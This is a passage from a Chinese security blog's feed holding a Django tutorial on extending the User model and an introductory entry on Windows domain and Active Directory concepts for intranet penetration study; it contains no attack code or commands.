    <id>https://www.twosmi1e.com/2019/12/25/Django的默认用户认证系统/</id>
    <published>2019-12-25T14:43:04.000Z</published>
    <updated>2019-12-28T16:26:06.184Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Django 用户认证系统提供了一个内置的 User 对象，用于记录用户的用户名，密码等个人信息。对于 Django 内置的 User 模型， 仅包含以下一些主要的属性：</p><ul><li>username，即用户名</li><li>password，密码</li><li>email，邮箱</li><li>first_name，名</li><li>last_name，姓</li></ul><p>对于一些网站来说，用户可能还包含有昵称、头像、个性签名等等其它属性，因此仅仅使用 Django 内置的 User 模型是不够。好在 Django 用户系统遵循可拓展的设计原则，我们可以方便地拓展 User 模型。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AbstractUser</span><span class="params">(AbstractBaseUser, PermissionsMixin)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    An abstract base class implementing a fully featured User model with</span></span><br><span class="line"><span class="string">    admin-compliant permissions.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Username and password are required. Other fields are optional.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    username_validator = UnicodeUsernameValidator()</span><br><span class="line"></span><br><span class="line">    username = models.CharField(</span><br><span class="line">        _(<span class="string">'username'</span>),</span><br><span class="line">        max_length=<span class="number">150</span>,</span><br><span class="line">        unique=<span class="keyword">True</span>,</span><br><span class="line">        help_text=_(<span class="string">'Required. 150 characters or fewer. Letters, digits and @/./+/-/_ only.'</span>),</span><br><span class="line">        validators=[username_validator],</span><br><span class="line">        error_messages=&#123;</span><br><span class="line">            <span class="string">'unique'</span>: _(<span class="string">"A user with that username already exists."</span>),</span><br><span class="line">        &#125;,</span><br><span class="line">    )</span><br><span class="line">    first_name = models.CharField(_(<span class="string">'first name'</span>), max_length=<span class="number">30</span>, blank=<span class="keyword">True</span>)</span><br><span class="line">    last_name = models.CharField(_(<span class="string">'last name'</span>), max_length=<span class="number">150</span>, blank=<span class="keyword">True</span>)</span><br><span class="line">    email = models.EmailField(_(<span class="string">'email address'</span>), blank=<span class="keyword">True</span>)</span><br><span class="line">    is_staff = models.BooleanField(</span><br><span class="line">        _(<span class="string">'staff status'</span>),</span><br><span class="line">        default=<span class="keyword">False</span>,</span><br><span class="line">        help_text=_(<span class="string">'Designates whether the user can log into this admin site.'</span>),</span><br><span class="line">    )</span><br><span class="line">    is_active = models.BooleanField(</span><br><span class="line">        _(<span class="string">'active'</span>),</span><br><span class="line">        default=<span class="keyword">True</span>,</span><br><span class="line">        help_text=_(</span><br><span class="line">            <span class="string">'Designates whether this user should be treated as active. '</span></span><br><span class="line">            <span class="string">'Unselect this instead of deleting accounts.'</span></span><br><span class="line">        ),</span><br><span class="line">    )</span><br><span class="line">    date_joined = models.DateTimeField(_(<span class="string">'date joined'</span>), default=timezone.now)</span><br><span class="line"></span><br><span class="line">    objects = UserManager()</span><br><span class="line"></span><br><span class="line">    EMAIL_FIELD = <span class="string">'email'</span></span><br><span class="line">    USERNAME_FIELD = <span class="string">'username'</span></span><br><span class="line">    REQUIRED_FIELDS = [<span class="string">'email'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        verbose_name = _(<span class="string">'user'</span>)</span><br><span class="line">        verbose_name_plural = _(<span class="string">'users'</span>)</span><br><span class="line">        abstract = <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clean</span><span class="params">(self)</span>:</span></span><br><span class="line">        super().clean()</span><br><span class="line">        self.email = self.__class__.objects.normalize_email(self.email)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_full_name</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Return the first_name plus the last_name, with a space in between.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        full_name = <span class="string">'%s %s'</span> % (self.first_name, self.last_name)</span><br><span class="line">        <span class="keyword">return</span> full_name.strip()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_short_name</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""Return the short name for the user."""</span></span><br><span class="line">        <span class="keyword">return</span> self.first_name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">email_user</span><span class="params">(self, subject, message, from_email=None, **kwargs)</span>:</span></span><br><span class="line">        <span class="string">"""Send an email to this user."""</span></span><br><span class="line">        send_mail(subject, message, from_email, [self.email], **kwargs)</span><br></pre></td></tr></table></figure></p><h2 id="继承AbstractUser-拓展用户模型"><a href="#继承AbstractUser-拓展用户模型" class="headerlink" title="继承AbstractUser 拓展用户模型"></a>继承AbstractUser 拓展用户模型</h2><p>内置的<code>User</code>模型就是继承的<code>AbstractUser</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(AbstractUser)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Users within the Django authentication system are represented by this</span></span><br><span class="line"><span class="string">    model.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Username, password and email are required. Other fields are optional.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span><span class="params">(AbstractUser.Meta)</span>:</span></span><br><span class="line">        swappable = <span class="string">'AUTH_USER_MODEL'</span></span><br></pre></td></tr></table></figure></p><p>所以，如果我们继承 AbstractUser，将获得 User 的全部特性，而且还可以根据自己的需求进行拓展。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserProfile</span><span class="params">(AbstractUser)</span>:</span></span><br><span class="line">    username = models.CharField(verbose_name=<span class="string">'用户名'</span>, max_length=<span class="number">20</span>)</span><br><span class="line">    name = models.CharField(verbose_name=<span class="string">'姓名'</span>, max_length=<span class="number">20</span>)</span><br><span class="line">    role = models.CharField(verbose_name=<span class="string">'用户角色'</span>, max_length=<span class="number">20</span>)</span><br><span class="line">    avatar = models.ImageField(verbose_name=<span class="string">'用户头像'</span>, max_length=<span class="number">200</span>, upload_to=<span class="string">'users/avatar/%Y/%m'</span>,</span><br><span class="line">                               default=<span class="string">'users/avatar/default.png'</span>, null=<span class="keyword">True</span>, blank=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        verbose_name = <span class="string">'用户'</span></span><br><span class="line">        verbose_name_plural = verbose_name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.username</span><br></pre></td></tr></table></figure><p>这里在内置模型基础上添加了一些字段。</p><p>同时，我们继承了 <code>AbstractUser</code> 的内部类属性 <code>Meta</code>。在这里继承 Meta 的原因是在你的项目中可能需要设置一些 Meta 类的属性值，不要忘记继承 AbstractUser.Meta 中已有的属性。</p><p>注意：一定要继承 <code>AbstractUser</code>，而不是继承 <code>auth.User</code>。尽管 <code>auth.User</code> 继承自 <code>AbstractUser</code>且并没有对其进行任何额外拓展，但 <code>AbstractUser</code>是一个抽象类，而 <code>auth.User</code> 不是。如果你继承了 <code>auth.User</code>类，这会变成多表继承，在目前的情况下这种继承方式是不被推荐的。</p><p>此外，AbstractUser 类又继承自 AbstractBaseUser，前者在后者的基础上拓展了一套用户权限（Permission）系统。因此如非特殊需要，尽量不要从 AbstractBaseUser 拓展，否则你需要做更多的额外工作。<br>为了让 Django 用户认证系统使用我们自定义的用户模型，必须在 settings.py 里通过 <code>AUTH_USER_MODEL</code> 指定自定义用户模型所在的位置，即需要如下设置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">django_auth_example/settings.py</span><br><span class="line"></span><br><span class="line"># 其它设置...</span><br><span class="line">AUTH_USER_MODEL = &apos;users.User&apos;</span><br></pre></td></tr></table></figure></p><h2 id="使用-Profile-模式拓展用户模型"><a href="#使用-Profile-模式拓展用户模型" class="headerlink" title="使用 Profile 模式拓展用户模型"></a>使用 Profile 模式拓展用户模型</h2><p>如果想为一个已使用了 Django 内置 User 模型的项目拓展用户模型，上述继承 AbstractUser 的拓展方式会变得有点麻烦。Django 没有提供一套自动化的方式将内置的 User 迁移到自定义的用户模型，因为 Django 已经为内置的 User 模型生成了相关数据库迁移文件和数据库表。如果非要这么做的话，需要手工修改迁移文件和数据库表，并且移动数据库中相关的用户数据。</p><p>所以我们采用另一种不改动数据库表的方式来拓展用户模型，具体来说，我们在创建一个模型（通常命名为 Profile）来记录用户相关的数据，然后使用一对一的方式将这个 Profile 模型和 User 关联起来，就好像每个用户都关联着一张记录个人资料的表一样。代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib.auth.models <span class="keyword">import</span> User</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    nickname = models.CharField(max_length=<span class="number">50</span>, blank=<span class="keyword">True</span>)</span><br><span class="line">    user = models.OneToOneField(User)</span><br></pre></td></tr></table></figure><p>这种方式和 AbstractUser  的区别是，继承 AbstractUser  的用户模型只有一张数据库表。而 Profile 这种模式有两张表，一张是 User 模型对应的表，一张是 Profile 模型对应的表，两张表通过一对一的关系关联。可见，当要查询某个用户的 Profile 时，需要执行额外的跨表查询操作，所以这种方式比起直接继承 AbstractUser  效率更低一点。因此对于新项目来说，优先推荐使用继承 AbstractUser  的方式来拓展用户模型。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Django 用户认证系统提供了一个内置的 User 对象，用于记录用户的用户名，密码等个人信息。对于 Django 内置的 User 模型
      
    
    </summary>
    
    
      <category term="Django" scheme="https://www.twosmi1e.com/tags/Django/"/>
    
      <category term="安全开发" scheme="https://www.twosmi1e.com/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透学习（一）</title>
    <link href="https://www.twosmi1e.com/2019/11/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://www.twosmi1e.com/2019/11/28/内网渗透学习（一）/</id>
    <published>2019-11-28T03:25:28.000Z</published>
    <updated>2019-11-28T04:07:42.648Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="内网概述"><a href="#内网概述" class="headerlink" title="内网概述"></a>内网概述</h3><p>内网也指局域网（Local Area Network，LAN）是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的历程安排、电子邮件和传真通信服务等功能。<br>内网是封闭型的，它可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。列如银行、学校、企业工厂、政府机关、网吧、单位办公网等都属于此类。</p><h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><p>工作组（Work Group），在一个大的单位内，可能有成百上千台电脑互相连接组成局域网，它们都会列在“网络（网上邻居）”内，如果这些电脑不分组，可想而知有多么混乱，要找一台电脑很困难。为了解决这一问题，就有了“工作组”这个概念，将不同的电脑一般按功能（或部门）分别列入不同的工作组中，如技术部的电脑都列入“技术部”工作组中，行政部的电脑都列入“行政部”工作组中。你要访问某个部门的资源，就在“网络”里找到那个部门的工作组名，双击就可以看到那个部门的所有电脑了。相比不分组的情况就有序的多了，尤其是对于大型局域网络来说。</p><p><img src="/2019/11/28/内网渗透学习（一）/1574857979516.png" alt="Alt text"></p><h4 id="加入或创建工作组"><a href="#加入或创建工作组" class="headerlink" title="加入或创建工作组"></a>加入或创建工作组</h4><p>在计算机-&gt;属性-&gt;更改设置里进行更改<br><img src="/2019/11/28/内网渗透学习（一）/1574859030693.png" alt="Alt text"></p><p>工作组与域不同，域中有域控和域用户，而工作组中所有计算机都是对等的,也就是没有服务器和客户机之分的。</p><h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p><strong>域(Domain)</strong>是一个有安全边界的计算机集合（安全边界意思是在两个域中，一个域中的用户无法访问另一个域中的资源），可以简单的把域理解成升级版的“工作组”，相比工作组而言,它有一个更加严格的安全管理控制机制,如果你想访问域内的资源,必须拥有一个合法的身份登陆到该域中,而你对该域内的资源拥有什么样的权限,还需要取决于你在该域中的用户身份。</p><p><strong>域控制器（Domain Controller，简写为DC）</strong>是一个域中的一台类似管理服务器的计算机，相当于一个单位的门卫一样，它负责每一台联入的电脑和用户的验证工作，域内电脑如果想互相访问首先都是经过它的审核。<br><img src="/2019/11/28/内网渗透学习（一）/1574859658430.png" alt="安全域划分"></p><h3 id="域的分类"><a href="#域的分类" class="headerlink" title="域的分类"></a>域的分类</h3><ul><li>单域</li><li>父域、子域</li><li>域树<code>tree</code></li><li>域森林<code>forest</code></li><li>DNS域名服务器</li></ul><h4 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h4><ul><li>在一般的具有固定地理位置的小公司里，建立一个域就可以满足所需。</li><li>一般在一个域内要建立至少两个域服务器，一个作为DC，一个是备份DC。如果没有第二个备份DC，那么一旦DC瘫痪了，则域内的其他用户就不能登陆该域了，因为活动目录的数据库（包括用户的帐号信息）是存储在DC中的。而有一台备份域控制器（BDC），则至少该域还能正常使用，期间把瘫痪的DC恢复了就行了。</li></ul><h4 id="父域"><a href="#父域" class="headerlink" title="父域"></a>父域</h4><ul><li>出于管理及其他一些需求，需要在网络中划分多个域，第一个域称为<strong>父域</strong>，各分部的域称为该域的<strong>子域</strong>。</li><li>比如一个大公司，它的不同分公司在不同的地理位置，则需父域及子域这样的结构。</li><li>如果把不同地理位置的分公司放在同一个域内，那么他们之间信息交互（包括同步，复制等）所花费的时间会比较长，而且占用的带宽也比较大。（因为在同一个域内，信息交互的条目是很多的，而且不压缩；而在域和域之间，信息交互的条目相对较少，而且压缩。）</li><li>还有一个好处，就是子公司可以通过自己的域来管理自己的资源。</li><li>还有一种情况，就是出于安全策略的考虑，因为每个域都有自己独有的安全策略。比如一个公司的财务部门希望能使用特定的安全策略（包括帐号密码策略等），那么可以将财务部门做成一个子域来单独管理。</li></ul><h4 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h4><ul><li>域树指若干个域通过建立信任关系组成的集合。一个域管理员只能管理本域的内部，不能访问或者管理其他的域，二个域之间相互访问则需要建立信任关系(Trust Relation)。</li><li><p>信任关系是连接在域与域之间的桥梁。域树内的父域与子域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。</p></li><li><p>在一个域树中，父域可以包含很多子域，子域是相对父域来说的，指域名中的每一个段。子域只能使用父域作为域名的后缀，也就是说在一个域树中，域的名字是连续的。<br><img src="/2019/11/28/内网渗透学习（一）/1574907055359.png" alt="Alt text"></p></li></ul><h4 id="域森林"><a href="#域森林" class="headerlink" title="域森林"></a>域森林</h4><p>域森林指若干个域树通过建立信任关系组成的集合。可以通过域树之间建立的信任关系来管理和使用整个森林中的资源，从而又保持了原有域自身原有的特性。</p><p><img src="/2019/11/28/内网渗透学习（一）/1574907804996.png" alt="Alt text"></p><h4 id="DNS域名服务器-Domain-Name-Server"><a href="#DNS域名服务器-Domain-Name-Server" class="headerlink" title="DNS域名服务器(Domain Name Server)"></a>DNS域名服务器(Domain Name Server)</h4><ul><li>DNS域名服务器是进行域名(domain name)和与之相对应的IP地址(IPaddress)转换的服务器。</li><li>在域树的介绍中，可以看到域树中的域的名字和DNS域的名字非常相似，实际上域的名字就是DNS域的名字，因为域中的计算机使用DNS来定位域控制器和服务器以及其他计算机、网络服务等。</li><li>一般情况下,我们在内网渗透时就通过寻找DNS服务器来定位域控制器，因为通常DNS服务器和域控制器会处在同一台机器上。</li></ul><h4 id="活动目录-AD"><a href="#活动目录-AD" class="headerlink" title="活动目录(AD)"></a>活动目录(AD)</h4><ul><li>活动目录（Active Directory）是域环境中提供目录服务的组件。</li><li>目录是什么？目录就是存储有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是帮助用户快速准确的从目录中查找到他所需要的信息的服务。</li><li>如果将企业的内网看成是一本字典，那么内网里的资源就是字典的内容，活动目录就相当于字典的索引。即活动目录存储的是网络中所有资源的快捷方式，用户通过寻找快捷方式而定位资源。</li></ul><h5 id="活动目录的主要功能"><a href="#活动目录的主要功能" class="headerlink" title="活动目录的主要功能"></a>活动目录的主要功能</h5><ul><li>帐号集中管理，所有帐号均存在服务器上,方便对帐号的重命令/重置密码。</li><li>软件集中管理，统一推送软件，统一安装网络打印机等。利用软件发布策略分发软件,可以让用户自由选择安装软件。</li><li>环境集中管理，利用AD可以统一客户端桌面,IE,TCP/IP等设置。</li><li>增强安全性，统一部署杀毒软件和扫毒任务，集中化管理用户的计算机权限、统一制订用户密码策略等，可监控网络，资料统一管理。</li><li>更可靠，更少的宕机时间。如：利用AD控制用户访问权限，利用群集、负载均衡等技术对文件服务器进行容灾设定，更可靠，宕机时间更少。</li><li>活动目录为Microsoft统一管理的基础平台，其它isa,exchange,sms等服务都依赖于这个基础平台。</li></ul><h5 id="AD和DC的区别"><a href="#AD和DC的区别" class="headerlink" title="AD和DC的区别"></a>AD和DC的区别</h5><ul><li>如果网络规模较大，我们就会考虑把网络中的众多对象：计算机、用户、用户组、打印机、共享文件等，分门别类、井然有序地放在一个大仓库中，并做好检索信息，以利于查找、管理和使用这些对象（资源）。这个有层次结构的数据库，就是活动目录数据库，简称AD库。</li><li>那么我们应该把这个数据库放在哪台计算机上呢？规定是这样的，我们把存放有活动目录数据库的计算机就称为DC(Domain Controller)。所以说我们要实现域环境，其实就是要安装AD，当内网中的一台计算机安装了AD后，它就变成了DC。</li></ul><h4 id="逻辑结构"><a href="#逻辑结构" class="headerlink" title="逻辑结构"></a>逻辑结构</h4><ul><li>在活动目录中，管理员可以完全忽略被管理对象的具体地理位置，而将这些对象按照一定的方式放置在不同的容器中。由于这种组织对象的做法不考虑被管理对象的具体地理位置，这种组织框架称为“逻辑结构”。</li><li>活动目录的逻辑结构就包括上面讲到的组织<strong>单元（OU）</strong>、<strong>域树（domain）</strong>、<strong>（tree）</strong>、<strong>域森林（forest）</strong>。在域树内的所有域共享一个活动目录，这个活动目录内的数据分散地存储在各个域内，且每一个域只存储该域内的数据。</li></ul><p><img src="/2019/11/28/内网渗透学习（一）/1574908618499.png" alt="Alt text"></p><h3 id="安全域划分"><a href="#安全域划分" class="headerlink" title="安全域划分"></a>安全域划分</h3><p>安全域划分的目的是将一组安全等级相同的计算机划入同一个网段内，这一网段内的计算机拥有相同的网络边界，在网络边界上采用防火墙部署来实现对其他安全域的NACL（网络访问控制策略），允许哪些IP访问此域、不允许哪些访问此域；允许此域访问哪些IP/网段、不允许访问哪些IP/网段。使得其风险最小化，当发生攻击时可以将威胁最大化的隔离，减少对域内计算机的影响。</p><p><img src="/2019/11/28/内网渗透学习（一）/1574909540036.png" alt="Alt text"></p><h4 id="DMZ-demilitarzed-zone"><a href="#DMZ-demilitarzed-zone" class="headerlink" title="DMZ(demilitarzed zone)"></a>DMZ(demilitarzed zone)</h4><ul><li>DMZ称为“隔离区”，也称“非军事化区”。是为了解决安装防火墙后外部网络不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。</li><li>这个缓冲区位于企业内部网络和外部网络之间的小网络区域内，在这个小网络区域内可以放置一些必须公开的服务器设施，如企业Web服务器、FTP服务器和论坛等。</li><li>另一方面，通过这样一个DMZ区域，更加有效地保护了内部网络，因为这种网络部署，比起一般的防火墙方案，对攻击者来说又多了一道关卡。</li></ul><h5 id="DMZ功能"><a href="#DMZ功能" class="headerlink" title="DMZ功能"></a>DMZ功能</h5><ol><li>内网可以访问外网</li></ol><ul><li>内网的用户需要自由地访问外网。在这一策略中，防火墙需要执行NAT。</li></ul><ol start="2"><li>内网可以访问DMZ</li></ol><ul><li>此策略使内网用户可以使用或者管理DMZ中的服务器。</li></ul><ol start="3"><li>外网不能访问内网</li></ol><ul><li>这是防火墙的基本策略了，内网中存放的是公司内部数据，显然这些数据是不允许外网的用户进行访问的。如果要访问，就要通过VPN方式来进行。</li></ul><ol start="4"><li>外网可以访问DMZ</li></ol><ul><li>DMZ中的服务器需要为外界提供服务，所以外网必须可以访问DMZ。同时，外网访问DMZ需要由防火墙完成对外地址到服务器实际地址的转换。</li></ul><ol start="5"><li>DMZ不能访问内网</li></ol><ul><li>如不执行此策略，则当入侵者攻陷DMZ时，内部网络将不会受保护。</li></ul><ol start="6"><li>DMZ不能访问外网</li></ol><ul><li>此条策略也有例外，比如我们的例子中，在DMZ中放置邮件服务器时，就需要访问外网，否则将不能正常工作。</li></ul><h3 id="域中计算机分类"><a href="#域中计算机分类" class="headerlink" title="域中计算机分类"></a>域中计算机分类</h3><ul><li>域控制器(DC)</li><li>成员服务器</li><li>客户机</li><li><p>独立服务器</p></li><li><p>域控制器是存放活动目录数据库的，是域中必须要有的，而其他三种则不是必须的，也就是说最简单的域可以只包含一台计算机，这台计算机就是该域的域控制器。</p></li><li>域中各个服务器的角色也是可以改变的，例如域服务器在删除活动目录时，如果是域中最后一个域控制器，则该域服务器会成为独立服务器，如果不是域中唯一的域控制器，则将使该服务器成为成员服务器。同时独立服务器既可以转换为域控制器，也可以加入到某个域成为成员服务器。</li></ul><h3 id="域内权限"><a href="#域内权限" class="headerlink" title="域内权限"></a>域内权限</h3><ul><li>组<ul><li><strong>组（Group）</strong>是用户帐号的集合。通过向一组用户分配权限从而不必向每个用户分配权限，管理员在日常工作中不必要去为单个用户帐号设置自己独特的访问权限，而是将用户帐号加入到相对应的安全组中。管理员通过给相对的安全组访问权限就可以了，这样所有加入到安全组的用户帐号都将有同样的权限。使用安全组而不是单个的用户帐号可以方便，简化网络的维护和管理工作。</li></ul></li><li><p>本地组</p></li><li><p>域本地组</p><ul><li><strong>域本地组</strong>，多域用户访问单域资源（访问同一个域）。可以从任何域添加用户账户、通用组和全局组，只能在其所在域内指派权限。域本地组不能嵌套于其他组中。它主要是用于授予位于本域资源的访问权限。</li></ul></li><li>全局组<ul><li><strong>全局组</strong>，单域用户访问多域资源（必须是同一个域里面的用户）。只能在创建该全局组的域上进行添加用户和全局组，可以在域林中的任何域中指派权限，全局组可以嵌套在其他组中。</li></ul></li><li>通用组<ul><li><strong>通用组</strong>，通用组成员来自域林中任何域中的用户账户、全局组和其他的通用组，可以在该域林中的任何域中指派权限，可以嵌套于其他域组中。非常适于域林中的跨域访问。</li></ul></li></ul><table><thead><tr><th>域本地组</th><th>来自全林用于本域</th></tr></thead><tbody><tr><td><strong>全局组</strong></td><td><strong>来自本域作用于全林</strong></td></tr><tr><td><strong>通用组</strong></td><td><strong>来自全林用于全林</strong></td></tr></tbody></table><h3 id="A-G-DL-P策略"><a href="#A-G-DL-P策略" class="headerlink" title="A-G-DL-P策略"></a>A-G-DL-P策略</h3><ul><li>A(account)，表示用户账号</li><li>G(Global group)，表示全局组</li><li>U(Universal group)，表示通用组</li><li>DL(Domain local group)，表示域本地组</li><li>P(Permission 许可)，表示资源权限。</li><li>A-G-DL-P策略是将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。按照AGDLP的原则对用户进行组织和管理起来更容易。</li><li>在AGDLP形成以后当给一个用户某一个权限的时候,只要把这个用户加入到某一个本地域组就可以了。</li></ul><h4 id="内置组权限"><a href="#内置组权限" class="headerlink" title="内置组权限"></a>内置组权限</h4><p><img src="/2019/11/28/内网渗透学习（一）/1574910907058.png" alt="Alt text"><br><img src="/2019/11/28/内网渗透学习（一）/1574910911019.png" alt="Alt text"></p><h4 id="本地域组的权限"><a href="#本地域组的权限" class="headerlink" title="本地域组的权限"></a>本地域组的权限</h4><ul><li>Administrators（管理员组）</li><li>Remote Desktop Users(远程登录组)</li><li>Print Operators（打印机操作员组）</li><li>Account Operators（帐号操作员组）</li><li>Server Operaters（服务器操作员组）</li><li>Backup Operators（备份操作员组）</li></ul><h4 id="全局组、通用组的权限"><a href="#全局组、通用组的权限" class="headerlink" title="全局组、通用组的权限"></a>全局组、通用组的权限</h4><ul><li>Domain Admins（域管理员组）</li><li>Enterprise Admins（企业系统管理员组）</li><li>Schema Admins（架构管理员组）</li><li>Domain Users（域用户组）</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;基础知识&quot;&gt;&lt;a href=&quot;#基础知识&quot; class=&quot;headerlink&quot; title=&quot;基础知识&quot;&gt;&lt;/a&gt;基础知识&lt;/h2&gt;&lt;h3 id=&quot;内网概述&quot;&gt;&lt;a href=&quot;#内网概述&quot; class=&quot;headerlink&quot; title=&quot;内网概述&quot;&gt;&lt;/a
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://www.twosmi1e.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="内网" scheme="https://www.twosmi1e.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>中间人攻击</title>
    <link href="https://www.twosmi1e.com/2019/11/12/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
    <id>https://www.twosmi1e.com/2019/11/12/中间人攻击/</id>
    <published>2019-11-12T02:14:46.000Z</published>
    <updated>2019-11-12T02:25:24.782Z</updated>
    
